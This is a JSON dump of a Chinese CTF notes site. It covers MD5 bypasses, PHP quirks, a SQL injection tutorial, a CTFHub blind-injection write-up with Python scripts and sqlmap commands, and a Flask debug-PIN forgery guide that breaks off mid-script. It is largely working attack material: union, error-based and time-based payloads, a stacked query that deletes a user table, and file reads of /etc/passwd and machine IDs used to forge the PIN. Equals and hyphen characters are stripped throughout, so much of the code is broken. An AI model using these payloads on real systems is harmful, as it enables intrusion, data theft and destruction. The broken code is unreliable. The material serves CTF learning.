{"/web/md5绕过汇总.html":{"title":"md5绕过汇总","content":" title: md5绕过汇总 ## 函数介绍 在php语言中，md5() 函数用于计算字符串的 MD5 散列。例如： ```php <?php $str \"Hello World!\"; echo md5($str); //默认输出 32 字符十六进制数 echo \"<br>\"; echo md5($str,TRUE); //输出原始 16 字符二进制格式 ?> ``` ## 相关漏洞 ### php弱比较 ```php <?php $a $_GET['a']; $b $_GET['b']; if ($a ! $b && md5($a) md5($b)) { die(\"Success!\"); } else{ die(\"Failed!\"); } ?> ``` 若两个字符经过MD5加密后的值为 0e 开头的字符串，在php弱比较中会被认为是科学计数法，表示为0*10的若干次方，结果为零，判定为相等。 下列字符串在经过MD5加密后形成值为 0e 开头的字符串。 ``` QNKCDZO 240610708 s878926199a s155964671a s214587387a s1091221200a ``` 下列字符串在经过MD5和二次MD5加密后均形成值为 0e 开头的字符串。 ``` CbDLytmyGm2xQyaLNhWn 770hQgrBOjrcqftrlaZk 7r4lGXCH2Ksu2JNT3BYM ``` 检验代码 ```php <?php $str \"CbDLytmyGm2xQyaLNhWn\"; echo md5($str); echo \"<br>\"; echo md5(md5($str)); ?> ``` 下列本身为 0e 开头字符串在经过MD5加密后可以再次形成值为 0e 开头的字符串。 0e215962017（验证有误？） ### php强比较 ```php <?php $a $_GET['a']; $b $_GET['b']; if ($a ! $b && md5($a) md5($b)) { die(\"Success!\"); } else{ die(\"Failed!\"); } ?> ``` md5()函数无法处理数组，如果传入的为数组，虽然会产生报错，但仍会返回NULL，所以两个数组经过加密后得到的均为NULL，在php强比较中判断为相等。 ### MD5碰撞 ```php <?php $a (string)$_GET['a']; $b (string)$_GET['b']; if ($a ! $b && md5($a) md5($b)) { die(\"Success!\"); } else{ die(\"Failed!\"); } ?> ``` 由于增加了一个转为字符串的强制类型转换，传数组的方法将不可行，这里就需要进行MD5碰撞，使用 Fastcoll 可以生成指定前缀的两个内容不同但是MD5值相同的文件。 新建一个head.txt写入指定前缀内容并保存，将这个文件拖到fastcoll.exe上，相当于使用fastcoll打开它，fastcoll会自动在同一目录下生成两个二进制文件，这两个文件内容不同但是MD5值相同。 也可以使用命令运行该程序。 `fastcoll.exe p head.txt o 1.txt 2.txt` 写程序读取文件内容并转化为url编码，转化编码的目的是生成的文件中存有不可见字符，以便于进行后续的传参工作。 ```php <?php function readmyfile($path){ $fh fopen($path, \"rb\"); $data fread($fh, filesize($path)); fclose($fh); return $data; } echo '二进制md5加密 '. md5( (readmyfile(\"1_msg1.txt\"))); echo \"</br>\"; echo 'url编码 '. urlencode(readmyfile(\"1_msg1.txt\")); echo \"</br>\"; echo '二进制md5加密 '.md5( (readmyfile(\"1_msg2.txt\"))); echo \"</br>\"; echo 'url编码 '. urlencode(readmyfile(\"1_msg2.txt\")); echo \"</br>\"; ?> ``` ### 构造sql注入攻击语句 当目标网站使用如下查询语句时，可以通过特殊字符串进行MD5加密后形成万能密码从而产生注入攻击。 `select * from 'admin' where password md5($pass,true)` 这个特殊字符串就是 ffifdyop ，在进行MD5加密后的值为`276f722736c95d99e921722cf9ed621c`， 对应的ascii字符串为 `'or'6�]��!r,��b `，这个字符串前几位刚好是`' or '6`， 而 Mysql 会将 hex 转成 ascii 解释，因此拼接之后的形式是`select * from 'admin' where password '' or '6<乱码>`，相当于`select * from 'admin' where password '' or 1`，即sql万能密码，能够绕过 md5() 函数。 ### 其它 对于题目的更多要求，可以自行编写 php 或者 python 脚本将特殊字符串的内容跑出来。"},"/web/PHP小特性.html":{"title":"PHP小特性","content":" title: PHP小特性 ## is_numeric() ### 简介 is_numeric() 函数用于检测变量是否为数字或数字字符串。 PHP 版本要求：PHP 4, PHP 5, PHP 7 ### 语法 ```php bool is_numeric ( mixed $var ) ``` ### 特性 在这个函数看来，`1234a`和`a1234`这类变量都不是数字，会输出 false 。 ## 强制类型转换 当字符串变量与数字变量进行弱比较时，字符串变量会被转换成数字，转换的方法是从左到右逐位转换，遇到不能转换的字符会停止转换，保留前面的转换结果。 例如，`1234a`会转换为`1234`，`a1234`会转换成`0`。 这个转换可以让 PHP 中的弱比较判断成立，例如，`1234a 1234a`。 ## 字符的非正确替换漏洞 在 PHP 7 中，可以使用`[`字符的非正确替换漏洞。当传入的参数名中出现`[`且之后没有`]`时，PHP 会将`[`替换为`_`，但此之后就不会继续替换后面的特殊字符了。 以`NewStar_CTF.2024`中的特殊字符`.`为例，PHP 默认会将其解析为`NewStar_CTF_2024`，也就是说第一个特殊字符（特殊字符包括点和空格）会被转替换成下划线。 当PHP版本小于8时，如果参数中出现中括号`[`，中括号会被转换成下划线`_`，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线`_`，也就是说如果中括号`[`出现在前面，那么中括号[还是会被转换成下划线`_`，但是因为出错导致接下来的非法字符并不会被转换成下划线`_`。"},"/web/index.html":{"title":"Web","content":" title: Web <html> <head> <meta http equiv \"refresh\" content \"0;url ./CTF导航.html\"> </head> </html>"},"/web/SQL注入漏洞.html":{"title":"SQL注入漏洞","content":" title: SQL注入漏洞 ## 漏洞概述 Web 应用开发过程中，为了内容的快速更新，很多开发者使用数据库进行数据存储。而由于开发者在程序编写过程中，对传入用户数据的过滤不严格，将可能存在的攻击载荷拼接到 SQL 查询语句中，再将这些查询语句传递给后端的数据库执行，从而引发实际执行的语句与预期功能不一致的情况，从而获取系统中的敏感信息，这种攻击被称为 SQL 注入攻击。这是现实场景下最常见的漏洞类型之一。 ## 漏洞分析 学习 SQL 注入漏洞需要你掌握一定的 SQL 基础，可以通过[SQL 教程 菜鸟教程](https://www.runoob.com/sql/sql tutorial.html)自行学习。 在此以 MySQL 数据库管理系统（常见的还有Microsoft SQL Server、SQLite等等）为例，简要地分析一下 SQL 注入漏洞。 ```php <?php if(isset($_GET['id'])) { $conn mysqli_connect(\"localhost\", \"root\", \"123456\", \"db test\"); $sql \"SELECT title,content FROM wp_news WHERE id \" . $_GET['id']; $res mysqli_query($conn, $sql) or die(mysqli_error($conn)); $row mysqli_fetch_array($res); echo \"<center>\"; echo \"<h1>\".$row['title'].\"</h1>\"; echo \"<br>\"; echo \"<h1>\".$row['content'].\"</h1>\"; echo \"</center>\"; } else { echo \"Please input the ID as parameter with numeric value\"; } ?> ``` 这是一个简单的php代码，用于查询数据库中的内容。 ```php $sql \"SELECT title,content FROM wp_news WHERE id \" . $_GET['id']; ``` 忽略一些无关紧要的代码段，让我们直接来看目标网站执行数据库查询操作的相关语句，很简单，是从 URL 中提取到参数 id 的值，然后拼接进入 SQL 语句，从数据表 wp_news 中查询出符合条件的记录。 `http://192.168.184.200/index.php?id 1` 正常情况下，用户通过 URL 参数 id 提交常规的数据 1，则程序中拼接出的 SQL 语句为 ```sql SELECT title,content FROM wp_news WHERE id 1 ``` 这是一条合法的 SQL 语句，访问数据库时应该可以查询到 id 1 的相关记录并回显。 由于该 Web 应用并未对将要拼接的内容进行过滤，我们可以通过 URL 参数 id 提交一些内容拼接进 SQL 语句构成危险敏感的命令语句，查询出开发者意料之外的数据。 ## 漏洞利用 `http://192.168.184.200/index.php?id 1'` 我们可以通过 URL 参数 id 提交数据 `1'`，则程序中拼接出的 SQL 语句为 ```sql SELECT title,content FROM wp_news WHERE id 1' ``` 这是一条非法的 SQL 语句，前端页面也确实回显了相关错误提示。 ```html You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1 ``` 通常情况下，可以使用这种方法来检查程序是否包含 SQL 注入漏洞。 发现目标程序存有 SQL 注入漏洞后，需要判断具体的漏洞类型来进一步利用漏洞，其实也就是摸清其程序的后端代码是如何处理 SQL 语句的（上面直接分析后端代码是为了更好地理解漏洞，真实情况并不会知道后端代码）。 `http://192.168.184.200/index.php?id 2 1` 通过 URL 参数 id 提交数据 `2 1`，则程序中拼接出的 SQL 语句为 ```sql SELECT title,content FROM wp_news WHERE id 2 1 ``` 前端页面并没有报错，而是返回了 id 1 的相关记录。 这也就说明了其程序后端做数据库处理的相关代码应该长这样 ```php $sql \"SELECT title,content FROM wp_news WHERE id \" . $_GET['id']; ``` 这就是最为经典的数字型 SQL 注入漏洞。 明确了漏洞的类型，我们就可以用相应的注入攻击方式来利用漏洞。 ## 基于UNION联合查询的注入 ### 数字型注入 继续前文的范例，我们来看看如何利用 UNION 注入攻击来应对数字型 SQL 注入漏洞。 #### 判断表内字段数 可通过 order by n 的报错机制来判断表内字段数，出现报错时，n 1即为表内字段数。 从 n 1 开始，不断的去试探。 `http://192.168.184.200/index.php?id 1 order by 1` 程序中拼接出的 SQL 语句为 ```sql SELECT title,content FROM wp_news WHERE id 1 order by 1 ``` 回显正常。 `http://192.168.184.200/index.php?id 1 order by 2` 回显正常。 当 n 3 时，页面出现了报错，说明表内字段数应为2。 ```html Unknown column '3' in 'order clause' ``` 除了使用 order by 的方法来判断表内字段数，还可以通过 union 的语法特点来判断。 `http://192.168.184.200/index.php?id 1 union select 0` 页面报错，说明表内字段数并非为1。 ```html The used SELECT statements have a different number of columns ``` `http://192.168.184.200/index.php?id 1 union select 0,0` 回显正常，说明表内字段数为2。 观察浏览器中的地址栏，你会发现你输入的内容被转化成了 `http://192.168.184.200/index.php?id 1%20union%20select%200,0` 对比你之前输入的内容，其中的空格被转换成了`%20`，这是因为，在使用浏览器进行网页请求的时候，网址中的特殊字符会被按照 URL 规范进行编码，这就是 URLEncode 。 #### 观察回显的字段 成功判断出表内字段数后，就要观察哪些字段在页面有所回显。 还是用 union 语句来进行试探。 `id 1 union select 1,2` 让 id 1 是为了让 select 语句查询出的第一行数据为空，以便于回显出我们后面 union 拼接进去的内容，观察 1 和 2 在页面中回显的位置，记录下来即可。 #### 获取库名 `id 1 union select 1,database()` database() 是一个常见的 MySQL 函数，返回当前连接上正在打开的数据库名称。 其他常见的函数还有： version()，返回当前 MySQL 服务器的版本。 user()，返回当前连接的登录用户名。 #### 获取表名 `id 1 union select 1,group_concat(table_name) from information_schema.tables where table_schema database()` 其中出现的 group_concat() 函数会将匹配到的结果连接成一个字符串进行输出，字符串中的每个结果默认用逗号作为分隔符。 information_schema 是MySQL 中存在的一个内置的系统数据库，其中的 tables 表中存有系统中每一张数据表的相关信息，包括表名称、所属数据库等等，该表中的 table_schema 字段存储的值即为对应的数据表的所属数据库的名称。 #### 获取字段名 `id 1 union select 1,group_concat(column_name) from information_schema.columns where table_name '<table_name>'` information_schema 中的 columns 表中存有每一个数据字段的信息，包括所属数据库名称、所属数据表名称、字段名称等等，该表中的 table_name 字段存储的值即为对应的数据字段的所属数据表的名称。 后续则是获取详细数据内容的操作。 #### 获取表wp_user中id 1的数据 `id 1 union select user,pwd from wp_user where id 1` #### 获取表wp_user中字段为user和pwd的信息 `id 1 union select group_concat(user),group_concat(pwd) from wp_user` #### 获取表wp_user中user字段值为'admin'的数据中字段id和pwd的值 `id 1 union select id,pwd from wp_user where user 'admin'` #### schemata表 获取所有数据库库名 ` 1 union select 1,group_concat(schema_name) from information_schema.schemata` 前面通过 database() 函数获取了库名，也可以通过查表方法获取所有数据库库名。 information_schema 中的 schemata 表中存有所有数据库的名称和字符集等信息，该表中的 schema_name 字段存储的值即为所有数据库的名称。 #### 巧用limit 查询数据库db test的第一个表名 ` 1 union select 1,(select table_name from information_schema.tables where table_schema 'db test' limit 0,1)` 可以不使用 group_concat() 函数，改使用 limit 来限制输出列数，确保 union 语句的语法正确，得到正确的输出。 ### 字符型注入 前文学习了如何利用 UNION 注入攻击来应对数字型 SQL 注入漏洞，其实应对字符型 SQL 注入漏洞的操作大同小异。 `http://192.168.184.200/index.php?id 1'` 首先是判断是否存在 SQL 注入漏洞，目标页面产生了相应的错误回显，说明存在 SQL 注入漏洞。 ```html You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1 ``` `http://192.168.184.200/index.php?id 2 1` 再判断存在何种 SQL 注入漏洞，浏览该页面后发现回显的结果和 id 2 时相同，并非返回 id 1 的相关记录，这说明后端的 SQL 语句在处理时将 2 1 这个参数识别成 2 了，其后端真实语句如下 ```php $sql \"SELECT title,content FROM wp_news WHERE id '\" . $_GET['id'] . \"'\"; ``` 与数字型 SQL 注入漏洞相比，从 url 中获取的参数 id 多了一对单引号的包裹，传入的 id 值将被作为字符串，再经过强制类型转换为数字后拼接进入 sql 查询语句。 `http://192.168.184.200/index.php?id 1'#` 我们可以尝试访问如上 url 来验证后端的处理语句，拼接完成后应该成为如下的语句形式。 ```sql SELECT title,content FROM wp_news WHERE id '1'#' ``` 数字后面的单引号对前面预设的单引号做了闭合操作，紧接后面的注释符注释了后面多余的单引号，不过当你尝试做这一步操作的时候，可能会发现浏览器并未返回出正确的页面，这还是因为 URL 编码的问题，需要我们手动进行编码再将 URL 输入到地址栏中进行访问。 `http://192.168.184.200/index.php?id 1%27%23` 那接下来的注入攻击流程便和应对数字型 SQL 注入漏洞一致了，将应对数字型 SQL 注入漏洞的注入部分添加到 %27 和 %23 之间即可。 获取所有数据库库名 ``` http://192.168.184.200/index.php?id 1%27%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema %27db test%27%23 ``` 其他操作不再赘述。 ## 盲注 ### 布尔盲注 见笔记文件另一文件夹 (点击跳转 >>>)[] ### 时间盲注 id 1' and if(length(database())>1,1,sleep(3)) + ## 报错注入 由于函数 updatexml() 的第二个参数需要 Xpath 格式的字符串，而这里第二个参数是 concat()函数，该函数此时的返回值是以~开头的字符串，这不是 xml 格式的语法，所以函数 updatexml()执行时会报错，而且会把 concat()函数的执行结果以错误的形式报出。通过这种方式，就可以在这里注入 SQL 语句，并通过出错信息获知其执行结果，把这种注入攻击的方法称之为报错注入。 注意，函数执行出错时，返回的报错信息最长是 32 位，如果第二个参数很长，超过32位，报错信息只返回前 32 位。 报错信息无法查看到所有所需信息时，可用 left() 或者 right() 等函数输出其余部分信息，例如： `1%27or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23` ### 获取库名 1' OR UPDATEXML(1, CONCAT(0x7e, (select database()), 0x7e), 1)%23 当空格被过滤时，可以替换成，下同 `1%27or(updatexml(1,concat(0x7e,database(),0x7e),1))%23` ### 获取表名 1' OR UPDATEXML(1, CONCAT(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema 'db test'), 0x7e), 1)%23 ### 获取字段名 1' OR UPDATEXML(1, CONCAT(0x7e, (select group_concat(column_name) from information_schema.columns where table_name 'wp_user'), 0x7e), 1)%23 ### 获取user字段数据 1' OR UPDATEXML(1, CONCAT(0x7e, (select group_concat(user) from wp_user), 0x7e), 1)%23 ### 获取pwd字段数据 1' OR UPDATEXML(1, CONCAT(0x7e, (select group_concat(pwd) from wp_user), 0x7e), 1)%23 ### 截断输出 这里我提前在数据库中替换了pwd字段的数据，可以发现该数据长度太长，不能完全在报错信息中展示 此时我们可以使用mid()函数截断数据进行输出 1' OR UPDATEXML(1, CONCAT(0x7e, mid((select group_concat(pwd) from wp_user),1,16), 0x7e), 1)%23 1' OR UPDATEXML(1, CONCAT(0x7e, mid((select group_concat(pwd) from wp_user),17), 0x7e), 1)%23 也可使用extractvalue()函数代替UPDATEXML()函数 ## 多语句注入 注入该语句，将当前库中wp_user表的信息清空了 1';delete from wp_user%23 获取当前数据库库名 ?id 1'; select 0,database()%23 ## 二次注入 在注册时注入包含sql语句的非法用户名，再通过其余页面访问该用户从而变相执行语句 ## 宽字节注入 对比数字型，只需在附加部分用 %df%27 <数字型注入部分> %23 包裹即可 payload中包裹users的引号对也会被转义导致语法错误，如果不使用引号对讲导致未知列错误。 将字符串转换成16进制即可不使用引号对从而避免这些问题。 ## 其余注入 上面的方法都是属于get注入，还有属于post注入的类型，那么下面的都是在request包中的注入 cookie注入 在cookie信息中附加sql语句即可 UA注入 User Agent Refer注入 Referer xff注入 X Forwarded For 在X Forwarded For信息中附加sql语句即可 ``` 绕过空格过滤的方式： /**/、()、%0a。 ``` [从0到1，SQL注入（sql十大注入类型）收藏这一篇就够了，技术解析与实战演练 FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/404072.html) [SQL注入（一）—— sql手动注入实操_sql注入手动注入方法 CSDN博客](https://blog.csdn.net/Genevieve_xiao/article/details/119487157) 判断注入点 判断字段数 观察回显字段 ## sqlmap ##"},"/web/2019-技能树-Web-布尔盲注/布尔盲注.html":{"title":"布尔盲注","content":" title: 布尔盲注 description: 2019 技能树 Web 布尔盲注 <! more > ## 题目考点 SQL注入 布尔盲注 ## 解题思路 ### tips 在注入语句时应当注意是在输入框中输入数据还是直接拼接在url后面，ctfhub的输入框似乎并不会正确识别“ ”符号，部分浏览器的地址栏并不会将“#”正确转义成注释符。 可以直接用相关符号的URL编码进行手工转义后拼接在url后面确保能被正确识别。 ``` %27 # 单引号' 的 URL 编码 %20 # 空格 的 URL 编码 %3C # 小于号< 的 URL 编码 %3E # 大于号> 的 URL 编码 ``` ### 注入分析 访问id 1，虽然无法知道从数据库检索出来的数据是什么，但此时能够从数据库中检索出非空数据。 ![](images\\1.png) 访问id 1，则不能从数据库中检索出数据。 ![](images\\2.png) 用and语句拼接布尔表达式，注入的布尔表达式结果为 true 时，返回query_success。 而注入的布尔表达式结果为 false 时，返回query_error。 访问id 1 and 1 1，返回query_success。 ![](images\\3.png) 访问id 1 and 1 1，返回query_error。 ![](images\\4.png) 访问id 1’ and 1 1 #，返回query_error。 ![](images\\5.png) 说明存在注入，并且是数字型的注入，如果是字符型的注入，则需要闭合前面的单引号和注释掉后面的多余字符。 通过这种方式，根据页面返回值的不同，得知注入的布尔表达式结果是 True 或者 False。这种方法就叫布尔盲注！ ### 手工注入 #### 猜解库名长度 ```1 and length(database()) 1``` ![](images\\6.png) 通过穷举法进行尝试，当注入``` 1 and length(database()) 4 ```时，返回query_success，说明当前使用的数据库名长度为4。 ![](images\\7.png) database()：返回当前使用数据库名称 length()：返回字符串的长度 #### 猜解库名 通过二分法进行尝试，不断注入逐步猜解出库名的每一位字符。 substr(str, pos, len)：截取字符串，str为字符串，pos为起始位置，len为截取字符长度。 ascii()：返回字符的ascii码 [ASCII 表 菜鸟教程](https://www.runoob.com/w3cnote/ascii.html) 以猜解库名的第一位字符为例，注入流程如下： ```1 and ascii(substr(database(),1,1))>97``` 返回query_success，说明数据库名的第⼀个字符的ascii值⼤于97，97为⼩写字母a的ascii值。 ![](images\\8.png) ```1 and ascii(substr(database(),1,1))<122``` 返回query_success，说明数据库名的第⼀个字符的ascii值⼩于 122，122为⼩写字母z的ascii值。 ```1 and ascii(substr(database(),1,1))<109``` 返回query_error，说明数据库名的第⼀个字符的ascii值不小于 109，109为⼩写字母m的ascii值。 ```1 and ascii(substr(database(),1,1))<116``` 返回query_success，说明数据库名的第⼀个字符的ascii值小于 116，116为⼩写字母t的ascii值。 范围较小时使用穷举法在已知范围内逐个尝试。 ```1 and ascii(substr(database(),1,1)) 115``` 返回query_success，说明数据库名的第⼀个字符的ascii值等于115，115为⼩写字母s的ascii值。 ![](images\\9.png) 当注入```1 and ascii(substr(database(),2,1))> 113```时，返回query_success，说明数据库名的第二个字符的ascii值等于113，113为⼩写字母q的ascii值。 ![](images\\10.png) 猜解库名的其他位字符，方法同上，得出完整的数据库名为“sqli”。 #### 猜解表的数量 注入```1 and (select count(table_name) from information_schema.tables where table_schema database()) 1```，返回query_error，说明表的数量不为1。 注入```1 and (select count(table_name) from information_schema.tables where table_schema database()) 2```，返回query_success，说明表的数量为2。 ![](images\\11.png) count(列名)：返回列名指定列的记录数 #### 猜解表名长度 注入```1 and length(substr((select table_name from information_schema.tables where table_schema database() limit 0,1),1)) 4```，返回query_success，说明第一个表名长度为4。 猜解第二个表名的长度则将 limit() 的第一个参数值由0修改为1。 limit(i,n)：从第i行数据开始，取n条数据，i从0开始。 #### 猜解表名 猜解第一个表名的第一个字符，返回query_success，说明第一个表名的第一个字符为f。 ```1 and ascii(substr((select table_name from information_schema.tables where table_schema database() limit 0,1),1,1)) 102``` 注入流程与方法参考猜解库名，最终得出完整的第一个表名为“flag”。 猜解第二个表名则将 limit() 的第一个参数值由0修改为1。 完整的第二个表名“news”。 #### 猜解字段的数量 猜解表flag的字段数量，返回query_success，说明表名flag的字段数量为1。 ```1 and (select count(column_name) from information_schema.columns where table_name 'flag') 1``` #### 猜解字段名的长度 猜解表flag中第一个字段名的长度，返回query_success，说明表flag中第一个字段名的长度为4。 ```1 and length(substr((select column_name from information_schema.columns where table_name 'flag' limit 0,1),1)) 4``` 若该表有第二个字段，猜解第二个字段名的长度则将 limit() 的第一个参数值由0修改为1。 #### 猜解字段名 猜解表flag中第一个字段名的第一个字符，返回query_success，说明表flag中第一个字段名的第一个字符为f。 ```1 and ascii(substr((select column_name from information_schema.columns where table_name 'flag' limit 0,1),1,1)) 102``` 若该表有第二个字段，猜解第二个字段名则将 limit() 的第一个参数值由0修改为1。 注入流程与方法参考猜解库名，最终得出表flag中完整的第一个字段名为“flag”。 #### 获取数据 注入如下语句，返回query_success，说明 sqli.flag 表下的 flag 列的第一个数据内容为小写字母c。 ```1 and ascii(substr((select flag from sqli.flag limit 0,1),1,1)) 99``` 若有第二个数据，猜解第二个数据则将 limit() 的第一个参数值由0修改为1。 注入流程与方法参考猜解库名，最终可得出表 sqli.flag 下的 flag 列中完整的第一个数据内容。 ### 脚本注入 我们可以用Python编写脚本来对目标网站进行自动注入。 mid()函数和substr()函数的使用方法类似。 #### 获取当前数据库中所有表名称 ```python # coding:UTF 8 import requests #目标url url 'http://challenge 3e5842a08066e481.sandbox.ctfhub.com:10800/?id 1' #设置一个空字符串，用于存放查询出来数据 result '' #i表示表的长度，一般不会超过30 for i in range(1,30): #j表示ascii码（字母、数字还有一些特殊符号） for j in range(32,127): #注入语句 payload \" and (select ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema database()), {}, 1))) {}\".format(i,j) #将网址和注入语句拼接成访问请求 r requests.get(url+payload) #print(r.text) if('query_success' in r.text): #将匹配到的字符添加到result中 result + chr(j) #打印匹配到的字符 print(result) #跳出此次循环 break ``` ![](images\\12.png) #### 获取表flag中所有字段名称 ```python # coding:UTF 8 import requests #目标url url 'http://challenge 3e5842a08066e481.sandbox.ctfhub.com:10800/?id 1' #设置一个空字符串，用于存放查询出来数据 result '' #i表示表的长度，一般不会超过30 for i in range(1,30): #j表示ascii码（字母、数字还有一些特殊符号） for j in range(32,127): #注入语句 payload \" and (select ascii(mid((select group_concat(column_name) from information_schema.columns where table_name 'flag'), {}, 1))) {}\".format(i,j) #将网址和注入语句拼接成访问请求 r requests.get(url+payload) #print(r.text) if('query_success' in r.text): #将匹配到的字符添加到result中 result + chr(j) #打印匹配到的字符 print(result) #跳出此次循环 break ``` ![](images\\13.png) #### 获取表flag中字段flag的数据 ```python # coding:UTF 8 import requests #目标url url 'http://challenge 3e5842a08066e481.sandbox.ctfhub.com:10800/?id 1' #设置一个空字符串，用于存放查询出来数据 result '' #i表示表的长度，一般不会超过50 for i in range(1,50): #j表示ascii码（字母、数字还有一些特殊符号） for j in range(32,127): #注入语句 payload \" and (select ascii(mid((select concat(flag) from flag), {}, 1))) {}\".format(i,j) #将网址和注入语句拼接成访问请求 r requests.get(url+payload) #print(r.text) if('query_success' in r.text): #将匹配到的字符添加到result中 result + chr(j) #打印匹配到的字符 print(result) #跳出此次循环 break ``` ![](images\\14.png) ### 使用sqlmap #### 获取库名 ```python sqlmap.py u \"http://challenge 3e5842a08066e481.sandbox.ctfhub.com:10800/?id 1\" dbs``` #### 获取表名 ```python sqlmap.py u \"http://challenge 3e5842a08066e481.sandbox.ctfhub.com:10800/?id 1\" D sqli tables``` ![](images\\15.png) #### 获取字段名 ```python sqlmap.py u \"http://challenge 3e5842a08066e481.sandbox.ctfhub.com:10800/?id 1\" D sqli T flag columns``` #### 获取数据 ```python sqlmap.py u \"http://challenge 3e5842a08066e481.sandbox.ctfhub.com:10800/?id 1\" D sqli T flag C flag dump``` ![](images\\16.png) ## FLAG 此题为动态FLAG。"},"/web/CTF导航.html":{"title":"CTF导航","content":" title: CTF导航 ## 了解 [CTF Wiki](https://ctf wiki.org/) [CTF Tools](https://ctf wiki.github.io/ctf tools/) [Hello CTF](https://hello ctf.com/) ## 靶场 [BUUCTF](https://buuoj.cn/) [Bugku CTF](https://ctf.bugku.com/) [NSSCTF](https://www.nssctf.cn/index) [星辰大海 NSSCTF](https://www.nssctf.cn/explore) [CTFHub](https://www.ctfhub.com/#/index) [CTFHub知识库](https://www.wolai.com/ctfhub/mx8kc7g4asd98bs8N2nk7F) [攻防世界](https://adworld.xctf.org.cn/home/index) [攻防世界 Web入门题](https://adworld.xctf.org.cn/challenges/problem set index?id 25) [攻防世界 Web入门题 讲解 bilibili](https://www.bilibili.com/video/BV1rz4y137dF/) [攻防世界 MISC入门题](https://adworld.xctf.org.cn/challenges/problem set index?id 1&rwNmOdr 1712475097686) [CTF秀](https://ctf.show/) ## 好文 [burpsuite实战指南](https://t0data.gitbooks.io/burpsuite/content/)"},"/web/Flask_PIN码伪造.html":{"title":"Flask_PIN码伪造","content":" title: Flask_PIN码伪造 ## 漏洞概念及成因 Flask 是一个用 Python 编写的，基于 WSGI（Web Server Gateway Interface）和 Jinja2 模板引擎的轻量级 Web 应用框架。 当 Flask 应用以 Debug 模式启动后，同时也会启动一个调试控制台，可通过浏览器访问`/console`路由进入，该调试控制台需要 PIN 码才能进入，而 PIN 码在服务端启动应用程序时会显示出来。进入调试控制台后，就可以执行 Python 语句和命令。 通常情况下，开发人员在开发阶段为了提高效率，会以 Debug 模式启动程序，而到了正式运行阶段，则会关闭 Debug 模式。但是有些粗心的开发人员或运维人员，在程序运行阶段，忘记关闭 Debug 模式，从而给攻击者以可乘之机。当然，进入并使用调试控制台，需要输入正确的 PIN 码。 我们在靶机上运行如下的 python 程序。 app.py ```python from flask import Flask, request app Flask(__name__) @app.route(\"/\") def index(): return \"<h1>[flask]pin码伪造</h1>\" @app.route(\"/fileread\") def read_file(): filename request.args.get(\"filename\") return open(filename).read() if __name__ \"__main__\": app.run(debug True, host \"0.0.0.0\", port 8000) ``` 由于打开了调试模式，在服务端启动该应用程序时则会显示 PIN 码以便于进入调试控制台进行调试。 ```console root@VM 8 17 ubuntu:~# python3 app.py * Running on http://192.168.184.200:8000/ (Press CTRL+C to quit) * Restarting with stat * Debugger is active! * Debugger PIN: 630 164 444 ``` 你可以尝试重新运行该程序，会发现显示的 PIN 码并没有发生改变，这说明，PIN 码是根据一些系统参数和相对固定的算法进行生成的。 ## 漏洞利用 接下来，我们需要配合该网站在`/fileread`路由下存在的任意文件读取漏洞，读取目标服务器的不同文件，获取重要参数，从而计算出正确的 PIN 码进入调试控制台。 `http://192.168.184.200:8000/fileread?filename 1` 尝试访问一个目标服务器中并不存在的文件，从而得到 Flask 报错页面，在这个页面上，我们可以得到一个路径`/usr/local/lib/python3.6/dist packages/flask/app.py`，这是 python 中 Flask 框架的文件路径，从这个路径名中可以得到 python 的版本号，也可以找到对应的生成 PIN 码的程序路径。 `http://192.168.184.200:8000/fileread?filename /usr/local/lib/python3.6/dist packages/werkzeug/debug/__init__.py` 在这个文件中，存有生成 PIN 码的关键函数`get_pin_and_cookie_name()`，具体算法生成 PIN 码的逻辑我们在此不予以深究，后续会有相关脚本可以直接使用，需要注意的一点是，不同版本的 python 在生成 PIN 码的算法方面有所区别，所以后续的脚本也会有所不同。 ### 生成 PIN 码需要哪些参数？ #### username 为启动该程序的用户名，通过读取文件`/etc/passwd`的内容进行猜测。 #### modname 默认值为`flask.app`。 #### appname 默认值为`Flask`。 #### moddir app.py 所在位置的绝对路径，即`/usr/local/lib/python3.6/dist packages/flask/app.py`。 #### uuidnode 当前网络 mac 地址的十进制数，一般通过读取文件`/sys/class/net/eth0/address`的内容得到16进制结果，转化为10进制即可，其中`eth0`为相应的网卡名字。 可以通过如下 python 程序进行转换 ```python str \"02:42:93:0a:ef:2e\" print(int(str.replace(\":\", \"\"), 16)) ``` #### machine_id 每一个机器都会有自已唯一的id，linux 的 id 一般存放在`/etc/machine id`或`/proc/sys/kernel/random/boot_id`中，docker 靶机则存放在`/proc/self/cgroup`中。 不同版本的 python 的 machine_id 构成不同 一般从以下文件/proc/self/cgroup、/etc/machine id,、/proc/sys/kernel/random/boot_id中的相关内容进行拼接或者单独构成，暂未实验得出具体结果。 如果想使用`/proc/self/cgroup`路径，但是`self`被过滤了，其中的`self`可以用相关进程的pid去替换，即`/proc/1/cgroup`，如果`cgroup`也被过滤了，可以使用`mountinfo`或者`cpuset`进行替换。 不同操作系统的 machine_id 所在路径 Linux etc/machine id，/proc/sys/kernel/random/boot_id，/proc/self/cgroup Windows SOFTWARE\\\\Microsoft\\\\Cryptography ### 生成 PIN 码 获取到生成 PIN 码的相关参数后，使用脚本生成 PIN 码。 python3.8及以上 ```python #MD5 import hashlib from itertools import chain probably_public_bits [ 'flaskweb' 'flask.app', 'Flask', '/usr/local/lib/python3.7/site packages/flask/app.py' ] private_bits [ '25214234362297', '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa' ] h hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit bit.encode('utf 8') h.update(bit) h.update(b'cookiesalt') cookie_name '__wzd' + h.hexdigest()[:20] num None if num is None: h.update(b'pinsalt') num ('%09d' % int(h.hexdigest(), 16))[:9] rv None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size 0: rv ' '.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv num print(rv) ``` python3.8以下 ```python #sha1 import hashlib from itertools import chain probably_public_bits [ 'root' 'flask.app', 'Flask', '/usr/local/lib/python3.8/site packages/flask/app.py' ] private_bits [ '2485377581187', 